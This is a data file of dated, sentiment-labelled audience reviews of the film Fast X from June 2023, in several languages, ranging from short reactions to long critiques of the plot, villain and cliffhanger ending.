"Jun 26, 2023",POSITIVE,"I really liked this movie. I think these movies are getting a bit over the top with these newer chapters but I think this one found a better balance than the last one. Fast 9 kinda sucked because it just got so stupid but Fast X works better because it balances a fun story and fun action with really silly moments which the last movie could not do as it lost the fun with just the level of crazy moments which I also found a problem with Fast 8 a a little bit of a problem in 7, 6, 5, 4 and 3 but 3 was bad in general. I would say this balance works so well I would call this my 3rd favorite in the franchise because the story of this one did silly and dumb and an actual plot really good but I would say the first 2 our better. This movie still has issues for sure like all the crazy and stupid moments still being kinda dumb to watch at times even if some are fun and the very dumb way the conflict is solved and the talking parts kinda suck due to the rest of the rest of the movie being so fun and the soundtrack is a bit weird and does not fit the tone a lot but still I had a very fun time. B+."
"Jun 26, 2023",POSITIVE,I don't like the ending part
"Jun 26, 2023",POSITIVE,All of the EXCITEMENT!!!!!
"Jun 26, 2023",NEGATIVE,"The movie is action beginning to end.  The action is so over the top that it is ridiculous.  I understand having so many A-list actors, but it is just too much. I would rather have good story telling and less action."
"Jun 26, 2023",POSITIVE,"It turns out that there is a link to the story, and the villain's role is so good, I look forward to the next fast 11"
"Jun 26, 2023",NEGATIVE,This movie is worst than an Indian movie and The film insults the intelligence of the audience.
"Jun 26, 2023",NEGATIVE,Worst fast and the furious. Please stop making these. So bad.
"Jun 26, 2023",NEGATIVE,"This movie is annoying to watch , You watch constantly as this  "" villian"" they created jumps around the screen always being one step ahead of the main charecters . And speaking of the villain,  they gave him the most annoying personity.   He is stuck on ""  iM sO QUirKy. "" for the entire movie .  Like there is a point where he talks to these dead guy's where he tapes their eyes open . Why does he do this ? No clue . They just chalk up all his quirkiness as to him just being insane .  Like this is like something Harley Quinn would do , minus the Harley Quinn charm and instead being done by some dude who switchs around his outfit and dresses like a little girl because he is so "" QUirKy "" ."
"Jun 26, 2023",POSITIVE,"This movie is definitely one of my favorites in the franchise. I loved the high stakes and story. It felt like there was more storytelling than the past few films. Jason Momoa carries the story, but Vin Diesel’s acting was a bit better. This movie had the best acting I’ve personally seen from John Cena so far. It really felt like he had a different character. Brie Larson’s acting was a weak unfortunately. Overall, loved this movie. Watch it if you haven’t already! I can’t wait for part 2. This was the most emotional out of the franchise I’ve seen. The only negative for me was that the first act isn’t much of a strong beginning."
"Jun 26, 2023",POSITIVE,Unexpected and great characters. Loved it!
"Jun 26, 2023",NEGATIVE,Las inconsistencias de la peli es absurda por dios cierren la saga ya
"Jun 26, 2023",POSITIVE,MUST SEE!!Best Ever!
"Jun 26, 2023",POSITIVE,me encanta pero ya esta perdiendo su esencia pero muy buena saga quiero ver las demas
"Jun 25, 2023",POSITIVE,"Honestly, it was pretty good! I loved everything about this. I just wish it didn't end like that. No spoilers here though!"
"Jun 25, 2023",NEUTRAL,"All in all a good action / car movie 
The bad Guy cant take him seriesly he dosent have the Bad guy vibe more like a funny Guy trying to be bad... 
Also i know this is a movie but Come on how can he have planned  all the things he did  and the timeing of all the stuff No one can time all the things he did kinda ruins the movie a bit  o Dons friends comes to help Dont worry i had that planned  Don drives of the dam survives the exsplosion i had that planned come on bhaa so lame tbh  but still hope part 2 will be a bit more realistic"
"Jun 25, 2023",NEGATIVE,"Si sigues esta franquicia y no te importa los problemas de pantalla verde o que cada personaje que muera reviva es para ti, es una pelicula para pasar el tiempo y cumple con entretener"
"Jun 25, 2023",POSITIVE,"I can say it was the best series after fast 7. It's definitely a worth watching movie with actions and it also rewind back the highlights of the whole series. Every characters have their own way to shine, especially the charming villain, Dante, the character portrayed by Jason Momoa. I would say this movie had fulfilled my visual satisfaction. Looking forward for the next!"
"Jun 25, 2023",POSITIVE,How do you top going to space? This movie answers that with a variety of insane action set pieces.
"Jun 25, 2023",NEUTRAL,Very good movie a little over the top
"Jun 25, 2023",POSITIVE,"I think the movie is great, as great as the previous one!"
"Jun 25, 2023",POSITIVE,Never doubt their jaw-dropping action sequences!!! THE STUNTS ARE ALWAYS THE MIND BLOWING part where i just cant get enough!!! Totally recommend to those who simply obsessed with stunts and heart pounding story plot!!!
"Jun 25, 2023",NEGATIVE,Good action and that’s about all. Car scenes have become unrealistic and bringing characters back shouldn’t be and definitely gotten away from what first few movies were about. Decent watch.
"Jun 25, 2023",POSITIVE,"Fast X continues the franchise's mission to scale bigger and campier heights, and there are moments that will have you full-volume hooting and hollering in your seat, but it's undone by the gravest sin of this cinematic universe: it breaks up the family."
"Jun 25, 2023",POSITIVE,"Fast and Furious always does a good job of connecting to past movies. This film had plenty of good action and Jason Mamoa does a great job making the audience hate his character. However, it is the same ole cliff hangers and always leaves the viewers wondering who is alive and who isn’t. All in all, it is a solid film. "
"Jun 25, 2023",NEGATIVE,"I'm an old fan of the F&F franchise. I will try to be honest. This is absolutely the worst film of the saga, even worse than when they went to space because at least in that film, they made me laugh and seemed to be deliberately making a parody of themselves. I also appreciated it but, unfortunately, everything was lost in this film. There is no plot, dead characters reappearing, ridiculous dialogues, lack of coherence in scenes and script. For the first time, with F&F, I played with the phone, waiting for it to finish to see what else would happen.
Questions: Why does Momoa acts like the Joker? I'd say this kind of approach would be best left to Ledger and Phoenix.
How does Momoa get alla info and photos of the gang that shouldn't exist because they were taken in private moments?
How does he finds Cypher in ten minutes?
Why (and this happens since few films) do the members of Dom's gang seem to have got Jason Bourne skills? But weren't they all street racers?
You know? As Master Morricone said ""the musical notes are seven, it is hard to create, always, something totally new"" but, in this case was enough to me to create something good.
The biggest question I leave is this. We know that Paul is dead but in this movie it seems ridicoulous how it seems he doesn't exists. Mia is there, the villain is trying to kill all family.... So what? I am sad to say that this franchise ended when Paul passed away.
Let's wait the last episode (because I am still a fan) and see how they will close the franchise."
"Jun 25, 2023",NEGATIVE,It was terrible! Not even for the effects or resurrecting characters… even if you turn off your brain still terrible!
"Jun 25, 2023",POSITIVE,Rating is strictly based off Jason Momoa giving this movie some personality and fun.
"Jun 25, 2023",POSITIVE,Very good this movie
"Jun 25, 2023",POSITIVE,Action packed movie!
"Jun 25, 2023",POSITIVE,More Greater than I expected. Thanks a Million Keep Them coming I Truly Enjoy Everyone
"Jun 25, 2023",POSITIVE,Don't like how they ended it
"Jun 24, 2023",POSITIVE,"The best fast and furious movie since Fast5. After an abysmal previous performance it feels like the ‘family' is back. Personally I believe that some continuity is what's been lacking in the franchise, this looks like a step in the right direction and above all else it leaves you wanting more. Dare I say it, I'm looking forward to the next instalment."
"Jun 24, 2023",NEGATIVE,"Appalling, just waisted my money watching this film. Finish the franchise it's done."
"Jun 24, 2023",POSITIVE,Really loved this movie. It had a lot of action in it was great.
"Jun 24, 2023",NEUTRAL,Best part about this movie is Jason Momoa. His performance is a lot of fun. Otherwise same old same old.
"Jun 24, 2023",POSITIVE,"""Fast X"" delivers an adrenaline-fueled joyride with heart-stopping action and mind-blowing stunts. The film ignites the screen with its high-octane racing sequences and jaw-dropping visual effects. The charismatic cast keeps the pedal to the metal, creating a thrilling experience for fans of the franchise. Buckle up for pure exhilaration!"
"Jun 24, 2023",POSITIVE,I really recommend this movie. It is very exciting and exciting. I was fascinated by the whole process. I strongly recommend everyone to watch it.
"Jun 24, 2023",POSITIVE,Love Jason Momoa acting
"Jun 24, 2023",POSITIVE,Thoroughly enjoyed this one. This one goes in my top 3 of 10 so far.
"Jun 24, 2023",POSITIVE,"It's a nice series of full of adventurous and excitement.
Worth for a five-stars rating and very recommended for all to watch."
"Jun 24, 2023",POSITIVE,Thought the plot was great and reminiscent of the best F&F movies so far. Loved the throw back scenes and the writing humor. Great cliff hanger at the end.
"Jun 24, 2023",NEGATIVE,Honestly if I'm being completely honest Jason Mamoa should have just stayed in the Atlantic Ocean cause is character was the most annoying and pathetic villain in the fast franchise he killed the entire vibe of what the movie could have been
"Jun 24, 2023",POSITIVE,Muy buena la película
"Jun 24, 2023",POSITIVE,"Have been waiting for so long time to see this movie ,finally can enjoy it .nice movie 😍"
"Jun 24, 2023",POSITIVE,Action-packed can't wait for the next one
"Jun 24, 2023",POSITIVE,Great Action! Jason M. Is fabulous!
"Jun 24, 2023",POSITIVE,"I'm not a huge fan but the movie was a great ride. Fun, full of energy and tons of stars."
"Jun 24, 2023",POSITIVE,"The way they've handled Brian's character is even more ridiculous now that the threats are so personally against ""the family"".  And the complete cliffhanger ending was a cheap shot to the fans."
"Jun 23, 2023",NEGATIVE,"Everything was bad. The story line was tired and weak, the acting was forced, and I'm over hlthem bringing people back from the dead. Enough."
"Jun 23, 2023",POSITIVE,"I enjoyed this movie immensely! Jason Momoa is amazing as the ""crazy"" bad guy. The central cast is fantastic as usual. And the guest stars only add to this already great movie. The action is, as always, unbelievable in a good ""there ain't no way"" way. Plus, it leaves you wanting the next installment to the franchise now!"
"Jun 23, 2023",NEGATIVE,"Exactly what you'd expect to see in a Fast and Furious film … for better or worse.  Nothing special, just another one pumped out of the factory. Jason Momoa was embarrassingly terrible as the overly cartoonish villian."
"Jun 23, 2023",NEUTRAL,"Ah, rejoice, for ""This"" be the very essence of brain-numbing action that one doth seek! With fast cars that roar and beautiful women that grace the screen, this film doth deliver a feast for the senses. The adrenaline doth surge as high-speed pursuits ignite, and the captivating allure of the fairer sex enchants the eye. In this realm of pure entertainment, ""This"" doth provide the escapism and thrills that one desires."
"Jun 23, 2023",POSITIVE,Very action packed....storyline good...but ending a mystery
"Jun 23, 2023",NEUTRAL,"Builds a main plot that doesn't last just one film. Not free of lazy writing but the scope it satisfyingly big. Packed with insane action, massive set pieces, & a charismatic villain. Twists & turns create a very solid installment."
"Jun 23, 2023",POSITIVE,"It's convoluted and silly, and comic-book-y... I can say all those things but I'm not being pejorative about any of it. It's exactly what you want from a big action-crazy cartoon."
"Jun 23, 2023",POSITIVE,"As a franchise fan, it didn't disappoint! I really enjoyed it, lots of action scenes and typical comedy relief. It had us laughing and at the edge of our seats. This time, we appreciated that it wasn't 'emotional' like other Blockbuster films that are out at the moment. It was just fun."
"Jun 23, 2023",NEGATIVE,"Majority of this stacked cast are under-utilised and often seem uninterested in participating in Vin Diesel's growingly unstable fantasy of fast cars, feeble twists and far too much family."
"Jun 23, 2023",NEUTRAL,"Jason Mamoa made it good, he was hilarious!!"
"Jun 23, 2023",NEUTRAL,"Good actions, and a villain that is not just one-dimensional character."
"Jun 23, 2023",POSITIVE,Para quem gosta de carros e ação …. Maravilhoso
"Jun 22, 2023",NEUTRAL,These are getting a little crazy but they’re still fun
"Jun 22, 2023",POSITIVE,It will pass this time
"Jun 22, 2023",POSITIVE,"The Fast family respects their cars, uses them as their main weaponry, and also wrecks tons throughout the courses across ten films, but how many miles are they willing to push their ride? They are considerate over the analogy in treating your car like forming a bond and not want to push it till it no longer drives in the middle of the road. Their vehicular franchise has finally been felt nearing its end with the gas tank almost empty and the finish line sort-of in sight with quite a distance left to make. But will it be cheerfully celebrated, or sighed upon the journey's end over those who joined the ride and are not there with them? Actually capping a long-running franchise with the concluding chapter(s) set up means anted stakes climaxing the overall narrative, uncertain fates by instinctual, sacrificial heroism, then concluding on peaceful, high note. ""Fast X"" is supposedly a penultimate chapter, and it means business.

Humble beginning in street racing before officer Brian O'Connor went on a run that led to another case and back into the authoritative folds, till he found himself unexcitingly reuniting with Dominic Toretto on a vengeance spree, eventually stranding them as outlaws in Mexico with Dom's sister Mia. They build their ticket out with the help of past associates, plus gaining couple new ones, to execute a heist, showing off their skills on greater proportions drags them into dangerous missions all over the world with unexpected, connected confrontations that makes or breaks their family. Their reliance on their motors pits them into impossible odds, managing to outmaneuver any crossed foes, and resume their peace. But how long can that peace last?

Once again retconning, or able to add a thread through open-ended scenery, with seamlessly added scenes that fits nicely without rearending the priorly existing narrative, the Fast family face their most lethal foe emerging from the shadows most of them thought faded by distance on the rearview mirror. As the 2011 heist brought down Brazilian drug kingpin Herman Reyes and his empire in Rio De Janeiro, only one survived and that is Reyes' son Dante, seeing the chaos and losing his family. Gone into hiding, Dante spent the last 12 years masterminding a plan to make Dom pay the ultimate price. Dante's inferno is proven terrifying as he separates Dom from his crew, being spread out across the globe forging new alliances and facing old enemies, then the true target gets revealed and the fiery vengeance thickens.

Considering how ""Fast Five"" gave the dormant franchise a boost it was thriving for, the tenth installment relived the exciting action-packed climax as its opening with half of the sequence being new inserts starring Momoa's character's connection during the empirical downfall. Criticism noted the film's coasting on the franchise's biggest and thankful best hits, but the impression made via cinematic language is equivalent to a roller coaster's launching start, and the adrenaline only ceases abruptly on a cliffhanger. Assumingly the pun for ""Fast X"" plays on ""fastest"", and based on the nonstop thrills certifies the descriptively correct title as the action, while mostly grounded this time, keeps on pushing past the level set by its predecessor and replicating some if their previous set pieces onto another level despite the implausible engines that are plain lowbrow.

Orchestrating the dangerous threats in every possible corner ahead of the curve is Jason Momoa's Dante Reyes, rising to be one of the most invulnerably alarming villains, embracing theatricality. Momoa's performance wildly electrifies as hungered for an against-type challenge that hints flamboyancy and gives it his all as a relentless villain but not without his signature charm tuned corrupted. The way he skillfully embodies the maniac stirred a mental image reminiscing in similar aura previously felt through Heath Ledger's phenomenal take on Joker in ""The Dark Knight"". Practically mentally becoming the Fast and Furious version of Joker running the streets, who truly challenged the Fast family more than Charlize Theron's gain, Jason Statham's hunt and Luke Evans' confidence.

Now speeding in the action thriller genre at ridicule stunts, the character-driven aspect stays as the core as previously discussed and realized from ""F9"". You have the first present scene in the family gathering, implicating the calm before the storm when unseen turns then twists ignites the thickening plot in a chain of events. Unbeknownst to them, it will be their last tranquility together, putting an emphasis on ""together"". But even so, the new drivers take over with Brie Larson's Tess, the daughter of Kurt Russel's Mr. Nobody, Alan Ritchson's Aimes who leads Mr. Nobody's agency whilst a composition of O'Connor and Dwayne Johnson's Luke Hobbs, and finally Daniela Melchoir as Isabel with a surprising connection that potentially could resolve one conflict. Then we get nice dynamics throughout from John Cena and Jordana Brewster fighting side by side as reunited siblings, the former protecting his nephew Little B while bonding, and unexpecting though brief with Theron and Michelle Rodriguez teaming up, similar to Johnson and Statham's team-up as initially started in ""The Fate of the Furious"". The impressive stakes-defining action pieces sets up the thrilling stage, including brief bouts being so well-coordinated, they are only relied on for exciting the sole value's peak, leaving the characters to move the story with human drama from their dynamical interactions expressing inner connections that the franchise embraces more since the beginning for promising resonance and amusing humor.

However, there are flawed corners to the best element as there is repetitiveness through their dynamical antics. An example would be the leaf-turning cycle of former threats finding good and aligning themselves as part of the Fast family, then there is continuous beefs that eventually serves in furthering bonds as reassurance that nothing would break it. That goes along another point on how former threats, after all they had caused such as Statham and Evans, side with the family because it shows they can still be victims and diving deeper to find they too have beef with the surfaced antagonist. How this will turn out for Theron's Cipher gets left questioned as she been put in a position to survive. A strong family made up of associated friends, but it seems considering what they are facing here only purposed for the thrills rather not personally as they have yet to face their true test despite frontally tackled in F8, a reversal antithesis to Dom and Brian in the earlier films."
"Jun 22, 2023",POSITIVE,"I'll always be excited to watch a new chapter in the franchise and I still get blown away with the action and car sequences. This one didn't disappoint and has a super all star cast. Jason mamoa was way too over the top though and I really wish he played a serious villain, would have made the movie so much better."
"Jun 22, 2023",NEGATIVE,"The absolute nonsense. The stupidest became even more stupid. Horrible story, and the worst performance, from everyone, without exception. 
The  Expendables deserves an Oscar, compare to FastX. What a waste of time, and money, most of all. Enjoy. :-)"
"Jun 22, 2023",NEUTRAL,"This film has the exact same formula as the last few. Action, unnecessary fight scenes, mumbled lines from the ""hero"" and loud cars. Overall I enjoyed this film and almost gave it an 8/10. Jason Momoa's acting is phenomenal and basically the only reason I'd recommend this film. The bits that are meant to be sad I didn't find sad at all and some of it felt boring. ITS ALSO A BLOODY 2 PARTER FILM so now we have to wait a year for a sequel to a finally of a series no one really wants but I am looking forward to seeing more Momoa"
"Jun 22, 2023",NEGATIVE,"has a nice blend of action and set piece moments, only downside is how to address paul walkers presence since momoa chases doms family every single one, lets hope that the following installments bring more stylistic action and not give us fast fatigue."
"Jun 22, 2023",NEUTRAL,"The only real kicker here is Jason mamoa. He's funny, charming but psychotic, and reaaaalllly sexy. His outfits are great too. Other than that, terrible dialogue, an incredibly unsatisfying cliffhanger, and no outstanding set pieces. Of course the action isn't bad or anything, but about 65% of it is hand to hand combat, not exciting and awesome car chases and stunts. F&f is about over the top car stuff that's only explanation is family, but this one is an ehh entry in my opinion."
"Jun 22, 2023",POSITIVE,Decisamente uno dei migliori film della saga. Ottima l'interpretazione di Jason Momoa.
"Jun 22, 2023",NEGATIVE,"I'm not really an OG f&f fan as I started watching when F9 came, so I just wanted to clear that up first. It started off pretty good with transitioning back in time, was impressed in the first hour, Jason momoa was a very unique villain and they introduced him slowly and perfectly for a unique villain in this franchise. The plot wasn't exactly the best compared to other movies such as Fast Five which is personally my favorite but it was pretty good. I think there were a bit too much plot twists, characters repeatedly were changing sides back and forth. It was not as nail-biting movie, it was just time passing. Aimes wasn't exactly a very unique character, didn't like how he kept changing sides, but it was all okay. They made Dante seem like a psychopath from the very first minute and then his slow character development and hate towards Dominic toretto increasing till the very end. This movie was revolving around lil Brian mainly, and one thing which I didn't like was that this movie was pretty split into 4 sections; one section was vin diesel and his journey in rio de janerio, the other was Jakob and Brian fleeing from the agency, one was letty and cipher escaping and the last one was tej, Roman, Ramsey and Han going around London. They gave the tej, Roman, Han, and ramsey's team fairly less screen time although they are my favorite (mainly because they're pretty funny and wholesome) This is a fairly unique concept as fast and furious is literally about family more than cars. I would've gave this movie a solid 4 stars but the 01:50 hour mark was the one where I lost it all, the chase between Dante and Jakob and dom felt pretty incomplete and underworked, especially if you compare it to other F&F chases, and 2 hour mark was where it started it's focal downfall, I had SO many questions and they left it on like 3 different cliffhangers; where the hell did the sub and Gisele come from??? Like don't get me wrong, I love Gisele but no explanation, no flashback, she randomly appeared and then the movie got cut. I actually was looking forward to Han and Gisele's reunion and I was anxiously waiting for them to show what happened at the plane crash, did they survive? Did anyone die and if yes then who? Did everyone die? Plus why did the plane come from literally out of the blue. But I kept waiting and then they cut the movie off. Like no reunion, no explanation to what happened at the crash. And then what happened with Dante and aimes? They were just standing there saying something big is coming. Like I get it 1 cliffhanger is alright, and to some extent even 2 are alright but 3 cliffhangers at one time is unacceptable. I'm pretty sure in Fast and furious 11 they'll show that everyone survived the crash except for 1 person, I'm theorizing it's maybe tej or Roman as Han literally just died and came back, and Ramsey is fairly new and plays a major role in the movie. Most probably Roman because he doesn't have any special skill set and I can see him dying but not tej. But tbh if Roman dies I will stop watching this franchise because I loved him T-T. And even if he doesn't die, I started to see a downfall in tej and Roman's friendship not only because of the fight but also because they started to become annoyed by each others jokes very often and didn't seem very comfortable with each other (that was my favorite friendship bruh). And Jakob's death was also pretty saddening even though he appeared in just 1 movie before this. Overall as a conclusion, the first 01:50 hours were a solid 4 stars, but rest of the movie was 1 star. The chase scene felt terribly underworked and incomplete. And lastly I had like 5 questions at the end of the movie. Those questions are; how did Gisele come back? what about the crash? Who survived the crash? Who died in the crash? What happened to aimes and Dante? I would've give this movie a 4.5 stars if I was watching this in 2025 when I had access to both fast X and F&F 11. Im pretty sure next movie will be a 5 stars or something because they brought back Gisele (as I said I loved her) and I'd love to see Han and Gisele's reunion lol. It'll be a 1 star if they kill Roman though. This movie left a very empty-ish feeling in my stomach and in all honesty ruined my whole day and now I can't wait for the next movie although it's coming in 2025. I really wish I could take my 2 hours back and watch it when the next movie is released"
"Jun 22, 2023",POSITIVE,"This movie is seriously a must see. A high octane, adrenaline pumping action flick. Jason Mamoa shines. Cant wait to see the finale."
"Jun 22, 2023",NEGATIVE,"The worst movie in the saga. Exaggeratedly fanciful. Completely removed from the original movie. It does not keep relevance with the previous film, useless characters and a waste of unnecessary casts. Boring, repetitive, predictable. Nothing new, nothing new."
"Jun 22, 2023",NEGATIVE,"If cheesy movies are what you're into, look no further.  Please kill this franchise."
"Jun 21, 2023",NEUTRAL,"For those who want to sit down and relax, this can be the right movie. It doesn't have the greatest plot, but it definitely has the best villain of the franchise. The action scenes are, as always, creative, but some VFX didn't look finished. If I had to choose one negative plot, it's obviously the ending - if it's possible to call it like this -, that just screwed the vibe up."
"Jun 21, 2023",NEGATIVE,"i have been a fan of fast and furious since the very first one. in my opinion they were great until Paul died off in 7. they should've ended it there, although 8 and 9 were decent, this movie completely made me rethink how much i love this series. the ending ruined my entire day. this is by far the worst fast and furious movie out of all of them. anyone who says this one was good is lying, otherwise, f*ck you."
"Jun 21, 2023",POSITIVE,"The story connected the best Fast movie, Fast Five with the ending of this franchise. The villain was great and the plot was well done compared to the most recent entries."
"Jun 21, 2023",NEUTRAL,"It is what it is a bunch of ex-cons using car-fu to save their family. If you're not on board at this point you probably never will be, but that isn't the movie's fault."
"Jun 21, 2023",POSITIVE,non stop action. great storyline. F & F will love it. anxiously waiting for next 2 parts!
"Jun 21, 2023",NEUTRAL,"Still Managing To Bring The Over The Top Flair Despite Some Cracks Beginning to Show, Fast X's Road To The Finale Promises A Huge Payoff At The Expense Of A Focused Installment."
"Jun 21, 2023",POSITIVE,"I thought the movie was great, smooth transition to bringing Jason Momoa into the film. There was an exceptional amount of action, and quirkiness. I believe this is one of the better Fast & Furious movies they've released."
"Jun 21, 2023",NEGATIVE,"I am Used to fast and furious movies being over the top. The best way to end fast x part 2, is to go back to the roots of what made these movies great. Driving hot cars fast, simple yet cohesive plots. Why is jason momoa in this movie? The guy cant act. K.i.s.s. jeep it simple stupid! These movies are about family. Fast cars and honor among thieves. Get back to that please no more ridiculousness like going to outer space!"
"Jun 21, 2023",POSITIVE,"Yeah some of the action scenes doesn't make any sense but anyway they are really entertaining and nothing out of Fast and Furious Theme, Family and Cars. Amazing shot and efforts of the casts are emotional. Epic ending for the sequel and can't wait for it."
"Jun 21, 2023",POSITIVE,very nice❤️❤️❤️❤️❤️❤️
"Jun 21, 2023",NEGATIVE,"They had a great cast ,killed off John Cena too soon....I assume he may have other commitments maybe....the dialog is was weak, action scenes were terrible these guys could have done far much better ,Jason mamoa could have come in as a whole different vilian creating a new direction with more options finally the plot guys you lost the plot with this one ...get a bigger director and better writers or this franchise will die out just now ..humble request from a loyal fan"
"Jun 21, 2023",POSITIVE,"this movie are really interesting 
and must wait till the end!!"
"Jun 21, 2023",NEGATIVE,The part ended is doesnt good. Doesnt show arrested or kill that bad guy
"Jun 21, 2023",NEGATIVE,Mildly entertaining but the stupidity ruined it for me.
"Jun 21, 2023",POSITIVE,"The movie was great lots of big action, new and old characters were great throughout the movie really enjoyed it!!"
"Jun 20, 2023",NEGATIVE,Jason Momoa's performance is the only thing that saves this movie. The stunts were utterly unbelievable and the acting even worse.
"Jun 20, 2023",POSITIVE,Effin ridiculous from the first half hour. Lol. And i loved it. Especially Momoa.
"Jun 20, 2023",NEUTRAL,It was okay. Kinda silly
"Jun 20, 2023",NEGATIVE,I want my 2 plus hours back. Quite possibly the worst movie that I've ever seen. Paul Walker would never have agreed to do this garbage if he was still alive.
"Jun 20, 2023",NEGATIVE,I've always been a fan of the series but they've gone too far and the characters were too pretentious so I could't enjoy this like the first 3-4 of them.
"Jun 20, 2023",NEGATIVE,"Fast n furious movies are always bad but this one makes no sense whatsoever. Getting kicked in the groin is about the same amount of fun as watching this movie, no sorry, more fun. Groot is being a dumb walking meatstick and so are the other male characters in the movie. Nothing makes sense, there is no story, no plot, nothing. Just a visual ""spectacle"" of cars and explosions, not a single thing based on reality. Its all a big mess. Luke puking for 2 hours this movie will leave you with a sour taste and empty feeling. Avoid. Or download illegaly."
"Jun 20, 2023",POSITIVE,"This isn't going to win an Oscar for best Script or anything, but it's a damn fun action flick."
"Jun 20, 2023",NEGATIVE,I loved most of the F&F movies but this one is just stupid. Not worth the $ I paid for it.
"Jun 20, 2023",POSITIVE,Some sequence should have been more polished but good enough anyways.
"Jun 20, 2023",POSITIVE,Action Packed. It  kept my interest.  I enjoyed it. I just needed a better ending . But it was a great  movie for the entire family.
"Jun 20, 2023",NEGATIVE,"Worst movie from franchise for sure. Im sure this movie dont deserve to be made even for pirate copy, so crappy it is. Worst part of movie was Brie Larsons acting play, it break all possible bottoms, she was not so good actress, but here, damn even my cat started cry when saw her playing."
"Jun 20, 2023",NEGATIVE,"A movie that is not realistic, and that's enough"
"Jun 20, 2023",POSITIVE,"My sister & I absolutely enjoyed this movie. Lots of action, stunt scenes awesome!  Laced with few comical scenes was great Five star action for sure"
"Jun 20, 2023",POSITIVE,"Good story, recommend"
"Jun 20, 2023",NEGATIVE,It's funny how they bring the characters back to life
"Jun 20, 2023",POSITIVE,I absolutely loved it hope you guys win for movie rewards 😁🙏🏻🛐
"Jun 20, 2023",NEUTRAL,I enjoyed the action scenes but the plot was mediocre.
"Jun 20, 2023",POSITIVE,"Title: ""Fast X

Fast X delivers an exhilarating cinematic experience that will leave fans of the franchise on the edge of their seats. As the tenth installment in the long-running series, the movie continues to push the boundaries of what's possible in the world of high-speed car chases and adrenaline-fueled action.

From the very first scene, Fast X wastes no time in plunging viewers into a world of intense vehicular stunts and heart-pounding sequences. The film's impressive visuals and top-notch special effects make each chase and race a visually stunning spectacle. Whether it's racing through narrow city streets or engaging in daring heists, the action sequences are skillfully executed and keep the audience engaged throughout.

In addition to the mind-blowing action, Fast X also manages to strike an emotional chord. The well-developed characters, played by a talented ensemble cast, bring depth and complexity to the story. The film explores themes of loyalty, family, and redemption, adding a layer of emotional resonance that resonates with audiences.

The chemistry between the cast members is palpable, and their performances are commendable. The charismatic leads bring their A-game, delivering the perfect blend of charm, wit, and intensity. The film also introduces new characters who seamlessly blend into the established Fast and Furious universe, adding fresh dynamics to the narrative.

Furthermore, Fast X pays homage to the franchise's roots while embracing a futuristic and technologically advanced setting. The blend of classic muscle cars with futuristic vehicles creates a visually captivating aesthetic that adds a new dimension to the Fast and Furious universe.

However, Fast X is not without its flaws. At times, the plot feels slightly predictable, and some character arcs may not receive as much attention as others. Nevertheless, these minor shortcomings do not detract significantly from the overall enjoyment of the film.

In conclusion, Fast X is a high-octane thrill ride that will satisfy fans and newcomers alike. It successfully combines heart-stopping action, emotional depth, and a visually stunning presentation. Fast X proves that even after ten films, the franchise still has plenty of gas in the tank, and it's a must-watch for any adrenaline junkie or fan of the series."
"Jun 20, 2023",POSITIVE,Amazing movie but the Theater was HORRIBLE
"Jun 20, 2023",NEUTRAL,La película sólo es MAMOA. Y ESTA GENIAL. las escenas de acción están dentro de lo normal pero a esta altura la película va mejor con los malos que con los buenos. Solo espero que Fast XI este a la altura de un cierre como se merece esta franquicia.
"Jun 20, 2023",NEGATIVE,"The CGI is almost as bad as the writing. This movie is wet, moldy garbage.

I grew up watching the original, but they've gotten progressively worse with each release. These movies are for 13 year olds and people who failed middle school."
"Jun 20, 2023",NEGATIVE,Nearly unwatchable due to the poorly written screenplay. What a waste of all the good actors on this movie. With all the money this franchise has made you'd think they could find a team of talented writers?
"Jun 20, 2023",NEGATIVE,"absolutely the worst yet, the storyline is meshed up, scenes make no sense, and dialogue is basic at best (family, respect, drive). only low IQ and children will enjoy this."
"Jun 20, 2023",POSITIVE,"I love Dante or Jason momoa's character. Much more than meets the eye. 

-Dante enchante'- is probably my favorite line. 

Plus who doesn't like fast n furious movies"
"Jun 20, 2023",NEGATIVE,"This movie was so bad. The story, the dialogue, the fake looking action scenes. What a waste of money!!! I couldn't wait until it was over."
"Jun 20, 2023",NEGATIVE,Não recomendo! Mais do mesmo!
"Jun 20, 2023",POSITIVE,Great action packed movie!!
"Jun 20, 2023",NEGATIVE,"I expected unbelievable scenarios.  However I was unprepared for this level of stupidity. Jason Mamoa was painful to watch. He was loathsome and unbelievable at the same time. I don't think I ever want to see him again (and I thought I was a fan). I left halfway through, it was making me feel like a sucker who was cheated out of his money. I snuck in to The Little Mermaid, much better, but I'm glad I didn't pay again."
"Jun 19, 2023",POSITIVE,Ba ba voss is my new favorite character I hope he wins
"Jun 19, 2023",NEGATIVE,O mais fraco dos filmes desta franquia na minha opinio. 
"Jun 19, 2023",NEGATIVE,"So disappointed,  huge fan of fast and furious but that just killed it.
Why bring jazel back , how many are you going to keep magically appearing from the dead?!
I get changing it up but that was too far, Jason mamoa is a great actor but that style of acting in this film was just weird. 
The graphics on parts were shocking.
I didn't want to believe the review but I agree that was the worst fast and furious yet. Your killing the film! Just stop before you ruin the whole thing,  parts of it were so predictable like Jacob dying like he did .. or is he going to survive that and come back in the next one? Just abit of a joke."
"Jun 19, 2023",NEUTRAL,The movie was very fun to watch. The movie sounded somewhat corny in some scenes though.
"Jun 19, 2023",POSITIVE,"Everything!
The storylines are put together well and the characters are still amazing!
Left us thinking at the end.
The action scenes were intense and the effects were great!
So glad I saw this in the theater!"
"Jun 19, 2023",NEGATIVE,"Comically awful.  When you create a world in a movie, fake or real, the elements surrounding it must work in that realm to have any sort of believability.  Letty and Ciper fight was nonsensical and Letty's back would be broken on the table fall. Cena's rocket car was ridiculous and crafted miraculously for what they needed at that moment. The spinning sequence of Dom getting his kid back in the car was just plain stupid. By the way, his spine would also have been crushed when he backed out of the airplane at least 80' high and landed the Charger on bad guys.  Then again, he was dead in the bus roll in Fast 5 at the very beginning and for sure dead in Furious 7 when he zoomed off the cliff with Ramsey (though she had a helmet!).  Jason Mamoa was horrible as the villain trying to be a crazy unisex, diabolically in control, mastermind who knew all of Cipher's men and found out their family stories to bride them?  Again-stupid.  Why have 2 remote control fuel tanker semis planned to crash into Dom (guess they knew he was coming in an airplane with a Charger in the back) only to also have the whole dam mined to explode?  Why?  Why bring in Rita Moreno or Pete Davidson?  Waste of time as they did nothing for the plot.  Its almost like the creators think we are so dumb that they can throw almost any silly element into a movie as long as its disguised under the moral armor of family and it will make a billion dollars.  Oh wait, apparently it will."
"Jun 19, 2023",NEUTRAL,"Better than the previous one, it's more fun to watch! Has the best villan in the franchise"
"Jun 19, 2023",NEGATIVE,This movie is a joke . I would rather watch the 90s power rangers show . The acting is better and it's more realistic
